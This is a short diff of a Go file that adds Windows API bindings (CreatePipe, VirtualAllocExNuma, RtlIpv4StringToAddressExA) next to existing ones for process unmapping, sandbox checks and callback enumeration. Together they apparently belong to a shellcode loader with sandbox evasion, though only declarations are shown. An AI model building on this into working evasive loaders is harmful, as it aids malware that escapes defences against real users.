@@ -89,10 +89,12 @@ var (
 	procCreateProcessW             = modkernel32.NewProc("CreateProcessW")
 	procEnumTimeFormatsA           = modkernel32.NewProc("EnumTimeFormatsA")
 	procEnumSystemLocalesA         = modkernel32.NewProc("EnumSystemLocalesA")
+	procCreatePipe                 = modkernel32.NewProc("CreatePipe")
 	// SandBox
 	procGetTickCount                       = modkernel32.NewProc("GetTickCount")
 	procGetPhysicallyInstalledSystemMemory = modkernel32.NewProc("GetPhysicallyInstalledSystemMemory")
 	procSleepEx                            = modkernel32.NewProc("SleepEx")
+	procVirtualAllocExNuma                 = modkernel32.NewProc("VirtualAllocExNuma")
 )
 
 // ntdll.dll
@@ -117,6 +119,7 @@ var (
 	procNtUnmapViewOfSection        = modntdll.NewProc("NtUnmapViewOfSection")
 	procNtQueryInformationProcess   = modntdll.NewProc("NtQueryInformationProcess")
 	procNtDelayExecution            = modntdll.NewProc("NtDelayExecution")
+	procRtlIpv4StringToAddressExA   = modntdll.NewProc("RtlIpv4StringToAddressExA")
 )
 
 // Rpcrt4
